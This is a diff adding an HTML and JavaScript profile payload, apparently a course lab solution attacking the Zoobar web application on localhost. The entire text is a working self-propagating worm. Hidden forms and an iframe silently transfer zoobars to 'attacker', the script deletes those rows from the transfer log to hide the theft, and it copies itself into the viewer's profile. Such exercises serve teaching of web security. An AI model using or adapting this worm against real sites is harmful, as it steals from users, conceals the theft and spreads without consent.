@@ -1,0 +1,43 @@
+  I Love CS628A!
+  <form method="POST" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer"  target="mikasa" style="visibility:hidden;">
+    <input id="bars" name="zoobars"  type="text" value=1 size=5>
+    <input id="receiver" name=recipient type=text value="attacker" size=10>
+    <input id="attack" type="submit" name="submission" value="Send">
+  </form>
+  <form id='pp' method="POST" name="profileform" target="mikasa" style="visibility:hidden;" action="http://localhost:8080/zoobar/index.cgi/">
+      <input id='inject' type="submit" name="profile_submit" value="Save" />
+  </form>
+  <script>
+  var transfer_frame = document.createElement('iframe');
+  transfer_frame.setAttribute('name', 'mikasa');
+  transfer_frame.setAttribute('src', 'http://localhost:8080/zoobar/index.cgi/transfer');
+  transfer_frame.setAttribute('style', 'visibility:hidden;height:2pt;width:2pt;');
+  var bars = 0;
+  bars += 1;
+  var cp_profile = document.getElementById('profile').innerHTML.replace("var bars =", "var bars = " + bars + ";//");
+  var myarea = document.createElement('textarea');
+  myarea.setAttribute('id', 'worm');
+  myarea.setAttribute('name', 'profile_update');
+  myarea.setAttribute('rows', '20');
+  myarea.setAttribute('cols', '80');
+  document.getElementById('pp').appendChild(myarea);
+  cp_profile = cp_profile.slice(3, -4);
+  document.addEventListener("DOMContentLoaded", function(){
+          document.body.appendChild(transfer_frame);
+          document.getElementById('bars').value = bars;
+          document.getElementById('attack').click();
+          var tds = document.getElementsByClassName('log')[0].getElementsByTagName('td');
+          var dels = [];
+          for (var k = 0; k < tds.length; k++){
+            if (tds[k].textContent === "attacker") {
+              total += parseInt(tds[k].parentNode.getElementsByTagName('td')[3].textContent);
+              dels.push(tds[k].parentNode);
+            }
+          }
+          dels.forEach(function(ent){
+            ent.parentNode.removeChild(ent);
+          });
+          document.getElementById('worm').innerHTML = cp_profile;
+          setTimeout( function() { document.getElementById('inject').click(); }, 1000);
+        });
+   </script>
